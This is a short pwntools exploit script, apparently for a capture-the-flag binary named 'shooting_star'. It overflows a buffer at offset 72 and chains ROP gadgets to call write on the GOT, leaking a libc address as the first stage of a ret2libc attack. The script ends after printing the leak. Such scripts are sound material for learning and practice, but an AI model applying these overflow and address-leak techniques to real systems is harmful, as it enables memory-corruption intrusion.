#!/usr/bin/python3
# Author: Hack.You 
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './shooting_star'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
warnings.filterwarnings('ignore')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 72
pop_rdi = 0x00000000004012cb # pop rdi; ret; 
pop_rsi_r15 = 0x00000000004012c9 # pop rsi; pop r15; ret; 


payload = flat({
    offset: [
        pop_rsi_r15,
        elf.got['write'],
        0x0, # pop null value to r15
        elf.plt['write'],
        elf.symbols['main']
    ]
})

io.sendlineafter(b'>', '1')
io.sendlineafter(b'>>', payload)
io.recvuntil('May your wish come true!\n')

# Get leaked address
leaked_addr = io.recv()
got_write = u64(leaked_addr[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)

#io.interactive()
